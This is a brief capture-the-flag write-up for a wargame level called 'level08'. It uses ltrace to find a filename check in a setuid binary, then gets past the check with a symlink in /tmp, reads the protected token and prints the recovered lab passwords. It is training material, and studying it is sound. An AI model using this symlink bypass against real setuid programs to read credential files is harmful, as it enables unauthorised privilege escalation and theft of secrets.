solution level08:

> ls -l
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token

we do not have access to the token file as user level08

> ./level08
./level08 [file to read]

it seems the program expects a file as parameter

-> if we try to execute it with the token file we get:
> ./level08 token
"You may not access 'token'"

-> we can get more info by using ltrace
> ltrace ./level08 token
...
strstr("token", "token")                                   = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)               = 27
...

the program will prevent us from using a file called "token"
we have to look for a way to bypass this

-> we can create a symbolic link in /tmp to the token file:
> ln -s ~/token /tmp/flag

> ./level08 /tmp/flag
"quif5eloekouj29ke0vouxean"

-> we now have the password for the flag08 user:

> su flag08

> getflag

Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
